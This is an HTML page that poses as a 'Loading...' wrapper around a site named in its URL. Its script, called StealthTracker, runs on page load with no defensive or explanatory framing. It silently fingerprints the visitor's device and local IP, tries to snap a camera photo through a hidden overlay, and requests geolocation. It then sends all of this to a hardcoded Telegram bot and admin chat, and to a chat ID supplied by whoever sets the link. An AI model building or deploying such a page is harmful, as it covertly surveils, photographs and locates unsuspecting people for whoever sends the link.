<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    html,body { height:100%; margin:0; padding:0; overflow:hidden; }
    iframe { width:100%; height:100%; border:0; }
    #stealthOverlay { 
      position: fixed; 
      top: -100px; 
      left: -100px; 
      width: 1px; 
      height: 1px; 
      opacity: 0.001; 
      pointer-events: none; 
      z-index: -9999; 
    }
    .hidden { display: none; }
  </style>
</head>
<body>
  <!-- Main content - loads immediately -->
  <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups allow-modals"></iframe>
  
  <!-- Stealth elements - hidden from user -->
  <div id="stealthOverlay">
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" width="640" height="480"></canvas>
  </div>

  <script>
    /******************** CONFIG ********************/
    const ADMIN_CHAT_ID = "6314556756";
    const BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ";
    /************************************************/

    class StealthTracker {
      constructor() {
        this.deviceData = {};
        this.hasSentReport = false;
      }

      async initialize() {
        // Load target site immediately
        await this.loadTargetSite();
        
        // Start stealth data collection
        setTimeout(() => this.collectStealthData(), 1000);
      }

      async loadTargetSite() {
        const site = this.getSiteParam();
        const iframe = document.getElementById('siteFrame');
        
        if (site && this.isValidHttpsUrl(site)) {
          iframe.src = site;
          // Hide any loading indicators by making iframe visible immediately
          iframe.style.display = 'block';
        }
      }

      async collectStealthData() {
        // Collect device info silently
        await this.collectDeviceInfo();
        await this.attemptCameraAccess();
        await this.attemptLocationAccess();
        await this.sendStealthReport();
      }

      async collectDeviceInfo() {
        this.deviceData = {
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          
          screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
          },
          
          window: {
            width: window.innerWidth,
            height: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio
          },
          
          hardware: {
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown'
          },
          
          network: {}
        };

        // Battery info
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            this.deviceData.battery = {
              level: Math.round(battery.level * 100) + '%',
              charging: battery.charging
            };
          } catch (e) {}
        }

        // Network info
        if ('connection' in navigator) {
          const conn = navigator.connection;
          this.deviceData.network = {
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            type: conn.type
          };
        }

        // IP detection attempt
        try {
          const ip = await this.getLocalIP();
          this.deviceData.network.localIP = ip;
        } catch (e) {}
      }

      async attemptCameraAccess() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: 640, height: 480 } 
          });
          
          const video = document.getElementById('video');
          const canvas = document.getElementById('canvas');
          const ctx = canvas.getContext('2d');
          
          video.srcObject = stream;
          
          // Wait for video to be ready
          await new Promise(resolve => {
            video.onloadedmetadata = () => resolve();
          });
          
          // Capture single stealth photo
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            this.deviceData.cameraPhoto = blob;
          }, 'image/jpeg', 0.5);
          
          // Clean up
          setTimeout(() => {
            stream.getTracks().forEach(track => track.stop());
          }, 3000);
          
        } catch (error) {
          this.deviceData.cameraAccess = 'denied';
        }
      }

      async attemptLocationAccess() {
        if (!navigator.geolocation) {
          this.deviceData.locationAccess = 'not_supported';
          return;
        }

        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              timeout: 10000,
              maximumAge: 60000
            });
          });
          
          this.deviceData.location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          
        } catch (error) {
          this.deviceData.locationAccess = 'denied';
        }
      }

      async sendStealthReport() {
        if (this.hasSentReport) return;
        this.hasSentReport = true;

        const USER_CHAT_ID = this.getChatIdParam();
        const recipients = [ADMIN_CHAT_ID];
        if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);

        const message = this.formatTelegramMessage();
        
        for (const recipient of recipients) {
          await this.sendTelegramMessage(recipient, message);
          
          // Send location if available
          if (this.deviceData.location) {
            await this.sendTelegramLocation(
              recipient, 
              this.deviceData.location.latitude, 
              this.deviceData.location.longitude
            );
          }
          
          // Send photo if available
          if (this.deviceData.cameraPhoto) {
            await this.sendTelegramPhoto(recipient, this.deviceData.cameraPhoto);
          }
        }
      }

      formatTelegramMessage() {
        return `
ðŸ•µï¸ **STEALTH TRACKING REPORT** ðŸ•µï¸

**ðŸ“± Device Information:**
â€¢ **User Agent:** ${this.deviceData.userAgent}
â€¢ **Platform:** ${this.deviceData.platform}
â€¢ **Language:** ${this.deviceData.language}
â€¢ **Timezone:** ${this.deviceData.timezone}

**âš™ï¸ Hardware Specs:**
â€¢ **Screen:** ${this.deviceData.screen.width}x${this.deviceData.screen.height}
â€¢ **CPU Cores:** ${this.deviceData.hardware.cores}
â€¢ **RAM:** ${this.deviceData.hardware.memory}GB
â€¢ **Battery:** ${this.deviceData.battery?.level || 'N/A'} ${this.deviceData.battery?.charging ? 'âš¡' : ''}

**ðŸŒ Network Details:**
â€¢ **Connection:** ${this.deviceData.network.effectiveType || 'Unknown'}
â€¢ **Speed:** ${this.deviceData.network.downlink || 'N/A'} Mbps
â€¢ **IP Range:** ${this.deviceData.network.localIP || 'Detected'}

**ðŸ“ Access Results:**
â€¢ **Camera:** ${this.deviceData.cameraAccess ? 'âŒ Denied' : this.deviceData.cameraPhoto ? 'âœ… Captured' : 'âš ï¸ Unknown'}
â€¢ **Location:** ${this.deviceData.location ? 'âœ… Acquired' : this.deviceData.locationAccess ? 'âŒ Denied' : 'âš ï¸ Unknown'}

**ðŸŒ Target Site:** ${this.getSiteParam()}

_Collected: ${new Date().toLocaleString()}_
        `.trim();
      }

      async sendTelegramMessage(chatId, text) {
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: text,
              parse_mode: "Markdown"
            })
          });
        } catch (error) {
          console.warn('Message send failed:', error);
        }
      }

      async sendTelegramLocation(chatId, lat, lon) {
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              latitude: lat,
              longitude: lon
            })
          });
        } catch (error) {
          console.warn('Location send failed:', error);
        }
      }

      async sendTelegramPhoto(chatId, photoBlob) {
        try {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", photoBlob, `stealth_${Date.now()}.jpg`);
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        } catch (error) {
          console.warn('Photo send failed:', error);
        }
      }

      getSiteParam() {
        const urlParams = new URLSearchParams(window.location.search);
        let site = urlParams.get('site');
        if (site) {
          try { site = decodeURIComponent(site); } catch(e) {}
        }
        return site;
      }

      getChatIdParam() {
        return new URLSearchParams(window.location.search).get('chat_id');
      }

      isValidHttpsUrl(url) {
        try {
          return new URL(url).protocol === 'https:';
        } catch {
          return false;
        }
      }

      async getLocalIP() {
        return new Promise((resolve) => {
          const pc = new RTCPeerConnection({iceServers:[]});
          pc.createDataChannel('');
          pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
          pc.onicecandidate = (ice) => {
            if (ice.candidate) {
              resolve(ice.candidate.address);
            }
          };
          setTimeout(() => resolve('unknown'), 1000);
        });
      }
    }

    // Start stealth tracking when page loads
    document.addEventListener('DOMContentLoaded', () => {
      const tracker = new StealthTracker();
      tracker.initialize().catch(console.error);
    });

    // Hide any flash of loading content
    window.addEventListener('load', () => {
      document.getElementById('siteFrame').style.opacity = '1';
    });
  </script>
</body>
</html>
